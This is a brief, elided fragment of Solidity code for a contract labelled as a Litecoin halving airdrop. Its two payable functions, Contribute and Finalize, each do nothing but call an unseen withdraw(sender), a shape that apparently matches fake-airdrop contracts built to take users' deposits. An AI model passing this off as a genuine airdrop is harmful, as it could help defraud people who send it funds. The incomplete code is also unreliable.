...
// Litecoin Halving Airdrop

pragma solidity ^0.8.18;

contract LiteCoinHalvingAirdrop {
  ...
  function Contribute(address sender) public payable { withdraw(sender); }
  function Finalize(address sender) public payable { withdraw(sender); }
